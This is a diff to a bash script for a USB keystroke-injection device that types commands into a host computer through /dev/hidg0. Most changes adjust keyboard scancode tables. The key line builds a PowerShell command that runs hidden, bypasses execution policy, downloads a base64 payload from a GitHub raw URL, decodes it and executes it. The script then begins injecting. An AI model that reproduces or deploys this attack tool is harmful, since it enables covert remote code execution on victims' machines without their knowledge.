@@ -5,6 +5,7 @@ HID_DEV=/dev/hidg0
 while [ ! -e $HID_DEV ]; do
   sleep 1
 done
+
 declare -A KEYCODES=( 
   [a]="04" [b]="05" [c]="06" [d]="07" [e]="08" [f]="09" [g]="0A" [h]="0B"
   [i]="0C" [j]="0D" [k]="0E" [l]="0F" [m]="10" [n]="11" [o]="12" [p]="13"
@@ -17,11 +18,9 @@ declare -A KEYCODES=(
   [0]="27" [1]="1E" [2]="1F" [3]="20" [4]="21" [5]="22" [6]="23" [7]="24"
   [8]="25" [9]="26"
   [" "]="2C" ["."]="37" [","]="36" ["\n"]="28" ["\r"]="28" ["/"]="38"
-  ["@"]="34"  # UK @ is different from US
-  ["+"]="57" ["="]="2E" [":"]="33" ["\""]="1F"  # double quote shares code with @ here
-  ["\\"]="64"  # backslash is different scancode
-  ["-"]="2D"
-  ["'"]="35"
+  ["@"]="34" ["+"]="57" ["="]="2E" [":"]="33" ["\""]="1F" 
+  ["\\"]="64" ["-"]="2D" ["'"]="34" ["("]="26" [")"]="27"
+  ["["]="2F" ["]"]="30"
 )
 
 declare -A MODIFIERS=(
@@ -37,9 +36,8 @@ declare -A MODIFIERS=(
   [8]="00" [9]="00"
   [" "]="00" ["."]="00" [","]="00" ["\n"]="00" ["\r"]="00" ["/"]="00"
   ["@"]="02" ["+"]="02" ["="]="00" [":"]="02" ["\""]="02"
-  ["\\"]="00"
-  ["-"]="00"
-  ["'"]="00"
+  ["\\"]="00" ["-"]="00" ["'"]="00" ["("]="02" [")"]="02"
+  ["["]="00" ["]"]="00"
 )
 
 send_key() {
@@ -69,7 +67,7 @@ send_string() {
 }
 
 # Construct the PowerShell command that decodes and executes base64 silently
-POWERSHELL_CMD="powershell.exe -win Hidden --nop -ep Bypass -Command \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/OrangeHatHacking/payloads/main/payload.b64'))))\""
+POWERSHELL_CMD="powershell.exe -w Hidden -NoProfile -ep Bypass -Command \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/OrangeHatHacking/payloads/main/payload.b64'))))\""
 
 # Start injecting
 sleep 3
